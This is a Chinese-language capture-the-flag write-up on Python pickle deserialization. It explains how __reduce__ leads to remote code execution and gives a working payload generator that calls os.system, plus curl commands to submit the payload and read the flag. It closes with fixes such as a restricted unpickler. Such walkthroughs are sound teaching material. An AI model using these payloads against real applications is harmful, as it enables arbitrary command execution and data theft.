# A08 Medium - WriteUP

## 漏洞原理

### Python Pickle 反序列化漏洞

Python 的 `pickle` 模块用于对象的序列化和反序列化。在反序列化过程中，`pickle.loads()` 会还原对象的状态。如果序列化的对象定义了 `__reduce__` 方法，pickle 会在反序列化时调用该方法，并执行其返回的函数和参数。

`__reduce__` 方法应返回一个元组 `(callable, args)`，在反序列化时，`pickle` 会执行 `callable(*args)`。攻击者可以构造恶意对象，让 `callable` 为危险函数（如 `os.system`、`subprocess.Popen`、`eval` 等），从而实现远程代码执行（RCE）。

### 题目漏洞点

```python
obj = pickle.loads(base64.b64decode(data))
```

题目直接反序列化了用户输入，没有进行任何校验或限制，导致攻击者可以构造恶意 pickle payload 执行任意命令。

## 利用步骤

### 第一步：生成恶意 Payload

```python
import pickle
import base64
import os

class Evil:
    def __reduce__(self):
        # 将 /flag 的内容写入可被访问的 static 目录
        return (os.system, ('cat /flag > /app/static/output.txt',))

payload = base64.b64encode(pickle.dumps(Evil())).decode()
print(payload)
```

### 第二步：提交 Payload

通过表单或 curl 提交：

```bash
curl -X POST http://target/deserialize \
  -d "data=gASVHgAAAAAAAACMBnN5c3RlbZSUCA......"
```

### 第三步：读取 flag

服务器执行命令后，`/flag` 的内容被写入 `/app/static/output.txt`。访问：

```bash
curl http://target/static/output.txt
```

即可获得 flag。

## 生成 Payload 的脚本

```python
#!/usr/bin/env python3
import pickle
import base64
import os

TARGET = "http://target"

def generate_payload(command):
    class Evil:
        def __reduce__(self):
            return (os.system, (command,))
    return base64.b64encode(pickle.dumps(Evil())).decode()

# 将 flag 写入 static 目录
payload = generate_payload('cat /flag > /app/static/output.txt')
print(f"Payload: {payload}")
print(f"\nCurl command:")
print(f"curl -X POST {TARGET}/deserialize -d 'data={payload}'")
print(f"\nThen get flag:")
print(f"curl {TARGET}/static/output.txt")
```

## 修复建议

1. **避免反序列化不可信数据**: 绝对不要反序列化来自用户输入的数据。如果必须处理序列化数据，使用 JSON 等安全格式替代 pickle。

2. **使用受限的反序列化器**: 如果必须使用 pickle，考虑使用 `pickletools` 进行静态分析，或者使用 ` RestrictedUnpickler` 限制可反序列化的类。

```python
import pickle

class RestrictedUnpickler(pickle.Unpickler):
    SAFE_CLASSES = {set, frozenset, tuple, list, dict}

    def find_class(self, module, name):
        # 只允许反序列化安全的内置类型
        if module == 'builtins' and name in ('set', 'frozenset', 'tuple', 'list', 'dict'):
            return getattr(__import__('builtins'), name)
        raise pickle.UnpicklingError(f"Forbidden class: {module}.{name}")

def safe_loads(data):
    return RestrictedUnpickler(io.BytesIO(data)).load()
```

3. **输入签名验证**: 对序列化数据使用 HMAC 签名，确保数据未被篡改且来自可信来源。

4. **沙箱隔离**: 如果必须反序列化不可信数据，在隔离的沙箱环境中执行，限制其对文件系统和网络的访问。

5. **使用 `json` 替代 `pickle`**: 对于简单的数据传输，使用 JSON 格式，它不会执行任意代码。
